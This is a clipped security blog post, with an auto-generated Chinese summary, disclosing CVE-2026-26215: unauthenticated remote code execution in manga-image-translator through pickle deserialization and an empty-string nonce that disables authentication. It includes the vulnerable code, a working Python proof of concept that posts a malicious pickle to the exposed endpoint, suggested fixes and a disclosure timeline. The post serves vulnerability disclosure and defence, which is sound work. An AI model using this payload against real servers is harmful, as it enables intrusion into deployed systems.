---
title: "manga-image-translator: Unauthenticated RCE via Pickle Deserialization with Nonce Bypass - Chocapikk's Cybersecurity Blog"
source: https://chocapikk.com/posts/2026/manga-image-translator-pickle-rce/
source_host: chocapikk.com
clip_date: 2026-09-24T10:30:29+08:00
trace_id: be14bf5f-dd58-4808-a628-e163c362f158
content_hash: 7030768a32f8cb4fe97eb22f171ad96d219c58ec37c1cabc9650d6bc8c57c232
status: synced
tags:
  - 漏洞分析
  - 反序列化
series: null
feed_source: Chocapikk·漏洞/Android RE
ai_summary: manga-image-translator 的 shared 模式把 HTTP 请求体直接交给 `pickle.loads()`，而 nonce 校验因默认空字符串被短路，导致所有标准部署都存在未授权 RCE（CVE-2026-26215）。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3e575244-d011-81a4-bcf2-f7df5312556e
ioc:
  cves:
    - CVE-2026-26215
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> manga-image-translator 的 shared 模式把 HTTP 请求体直接交给 `pickle.loads()`，而 nonce 校验因默认空字符串被短路，导致所有标准部署都存在未授权 RCE（CVE-2026-26215）。
> 
> - **漏洞点：** `/simple_execute/{method_name}` 与 `/execute/{method_name}` 两个 FastAPI POST 接口，把原始请求体直接传入 `pickle.loads()`。
> - **认证绕过：** `check_nonce()` 里写的是 `if self.nonce:`，而 `--nonce` 默认取 `os.getenv('MT_WEB_NONCE','')`，空串在 Python 中为假值，整段校验被跳过；Docker Compose、Makefile、部署文档都没设置该变量，等于默认无认证。
> - **利用条件：** 伪造 `__reduce__` 返回 `os.system` 的类，序列化后 POST 到 `/simple_execute/translate` 即可执行任意命令；反序列化发生在 ML 推理之前，无需 GPU；服务虽返回 HTTP 500，但命令已执行。
> - **暴露面：** shared 服务默认绑定 `0.0.0.0:5003`，`server/main.py` 另在 5004 起内部实例，网络内任何人可访问；项目 9,369 stars、Docker Hub 22,925 次拉取。
> - **修复与历史：** 建议 nonce 默认改 `None` 并随机生成、用 JSON/MessagePack 取代 pickle、把 worker 限制在 localhost；腾讯云鼎实验室 2025-05 提交的同类 issue #946 无人响应、被 stale bot 自动关闭，2026-02-11 才获配 CVE-2026-26215。

## Introduction

While auditing pickle deserialization patterns across popular ML/AI projects on GitHub, I found a critical vulnerability in **manga-image-translator**, a widely-used open-source tool for translating manga and comics with 9,369 stars.

Two FastAPI endpoints call `pickle.loads()` directly on HTTP request bodies. There’s supposed to be a nonce-based authentication mechanism protecting them, but it defaults to an empty string - which is falsy in Python - so the check never executes. The result is unauthenticated RCE on every standard deployment.

**Target:** [zyddnys/manga-image-translator](https://github.com/zyddnys/manga-image-translator) **Stars:** 9,369 **Severity:** Critical (CVSS 3.1: 9.8)

## What is manga-image-translator?

manga-image-translator is an automated tool that detects, OCRs, and translates text in manga/comic images. It supports multiple languages and translation backends (GPT-4, DeepL, Google, etc.) and can run as a web server, CLI tool, or browser extension.

> A quick look at the project’s issue tracker reveals users asking how to use it on [exhentai.org links](https://github.com/zyddnys/manga-image-translator/issues/442). I’ll let you draw your own conclusions about what **9,300+ stars** worth of users are translating at 3 AM.

The project has a `shared` mode where a FastAPI server handles translation requests. This mode is used internally by the web server (`server/main.py`) which spawns a `MangaShare` instance as a subprocess, communicating via HTTP with pickle-serialized payloads.

## The Vulnerability

The `shared` mode server in `manga_translator/mode/share.py` exposes two POST endpoints that take raw bytes from the network and pass them straight to `pickle.loads()`.

**Endpoint 1 - `/simple_execute/{method_name}`** at [line 112](https://github.com/zyddnys/manga-image-translator/blob/a537cb12b41daf2065795058c2753d87e73fa0fe/manga_translator/mode/share.py#L112):

```python
@app.post("/simple_execute/{method_name}")
async def execute_method(request: Request, method_name: str = Path(...)):
    self.check_nonce(request)
    self.check_lock()
    method = self.get_fn(method_name)
    attr = pickle.loads(await request.body())  # RCE here
```

**Endpoint 2 - `/execute/{method_name}`** at [line 130](https://github.com/zyddnys/manga-image-translator/blob/a537cb12b41daf2065795058c2753d87e73fa0fe/manga_translator/mode/share.py#L130):

```python
@app.post("/execute/{method_name}")
async def execute_method(request: Request, method_name: str = Path(...)):
    self.check_nonce(request)
    self.check_lock()
    method = self.get_fn(method_name)
    attr = pickle.loads(await request.body())  # RCE here
```

### The Nonce Bypass

There’s a `check_nonce()` method that’s supposed to gate access:

```python
def check_nonce(self, request: Request):
    if self.nonce:              # '' is falsy - this entire block is skipped
        nonce = request.headers.get('X-Nonce')
        if nonce != self.nonce:
            raise HTTPException(401, detail="Nonce does not match")
```

The problem is the nonce defaults to an empty string in all argument parsers:

```python
# manga_translator/args.py, line 144
parser_api.add_argument('--nonce', default=os.getenv('MT_WEB_NONCE', ''), ...)

# server/args.py, line 45
parser.add_argument('--nonce', default=os.getenv('MT_WEB_NONCE', ''), ...)
```

Since `''` is falsy in Python, `if self.nonce:` evaluates to `False`, and **the entire authentication check is skipped.** The `MT_WEB_NONCE` environment variable is never set in any Docker Compose file, not in the Makefile, not in any deployment documentation. **Every single standard deployment runs without authentication.**

This is a subtle bug because it looks like there’s authentication in place. A code reviewer would see `check_nonce(request)` being called and assume the endpoint is protected. You have to trace through the argument defaults to realize the guard is dead code.

## Proof of Concept

### Setting Up the Target

I tested this against the real manga-image-translator codebase, cloned from the repository:

```bash
git clone https://github.com/zyddnys/manga-image-translator.git
cd manga-image-translator
pip install -r requirements.txt
python -m manga_translator shared --host 0.0.0.0 --port 5003
```

No GPU required - the `pickle.loads()` executes before any ML inference. The server starts on `http://0.0.0.0:5003`.

### The Exploit

```python
import pickle, os, requests

class RCE:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

# No X-Nonce header needed - auth is bypassed
requests.post(
    'http://target:5003/simple_execute/translate',
    data=pickle.dumps(RCE('id > /tmp/manga_pwned')),
    headers={'Content-Type': 'application/octet-stream'},
)
```

### Result

```plaintext
$ cat /tmp/manga_pwned
uid=1000(chocapikk) gid=1001(chocapikk) groups=1001(chocapikk),4(adm),24(cdrom),27(sudo),...
```

Both `/simple_execute/translate` and `/execute/translate` are exploitable. The server returns HTTP 500 (the deserialized `int` from `os.system()` isn’t a valid kwargs dict), but the command has already executed during `pickle.loads()`.

## Prior Disclosure

I wasn’t the first to find this. [Issue #946](https://github.com/zyddnys/manga-image-translator/issues/946) was filed by [sud0why](https://github.com/sud0why) at Tencent YunDing Security Lab reporting the exact same pickle deserialization RCE. Nobody from the project responded for six months, then the stale bot auto-closed it. Earlier issues [#509](https://github.com/zyddnys/manga-image-translator/issues/509) and [#516](https://github.com/zyddnys/manga-image-translator/issues/516) also requested security improvements and were closed without resolution.

**No CVE was ever assigned** despite the Tencent report - until now: [CVE-2026-26215](https://www.cve.org/CVERecord?id=CVE-2026-26215).

## Attack Surface

The `shared` mode server binds to `0.0.0.0:5003` in all standard configurations. The web server (`server/main.py`) spawns it on port 5004 internally. Both are accessible to anyone on the network.

The project has a significant install base - 9,369 stars, 22,925 Docker Hub pulls, and a Discord community of 3,300+ members.

## Suggested Fix

1.  **Fix the nonce default.** Change the default from `''` to `None`, auto-generate a random nonce when `None`, and require `--nonce=disable` for users who explicitly want no auth. This makes insecure configuration a deliberate choice instead of the default.
2.  **Replace `pickle.loads()` with JSON or MessagePack.** The serialized data is just method arguments - there’s no reason to use pickle.
3.  **Restrict the shared worker to localhost.** The IPC between `server/main.py` and the `shared` worker shouldn’t be exposed externally.

## Timeline

-   **2025-05:** Tencent YunDing Security Lab ([sud0why](https://github.com/sud0why)) reports the same vulnerability in [issue #946](https://github.com/zyddnys/manga-image-translator/issues/946) - no response, auto-closed by stale bot after 6 months
-   **2026-02-11:** Vulnerability independently discovered and confirmed via PoC against real server
-   **2026-02-11:** CVE request submitted to VulnCheck
-   **2026-02-11:** [CVE-2026-26215](https://www.cve.org/CVERecord?id=CVE-2026-26215) assigned by [VulnCheck](https://www.vulncheck.com/advisories/manga-image-translator-shared-api-unsafe-deserialization-rce)
-   **2026-02-11:** [Public disclosure with patch](https://github.com/zyddnys/manga-image-translator/issues/1116)

## Takeaways

This one stands out because of the false sense of security. The nonce mechanism exists in the code, a reviewer would see `check_nonce(request)` being called, and they’d move on. You have to trace through the argument defaults to realize the guard is dead code by default. Security features that ship disabled are worse than no security features - they create a false sense of protection.

The Tencent report being auto-closed is also telling. [sud0why](https://github.com/sud0why) filed a clear, well-documented RCE report in May 2025. Nobody responded for six months, then the stale bot closed it. The bot doesn’t distinguish between “this issue was resolved” and “nobody cared enough to look at it.”
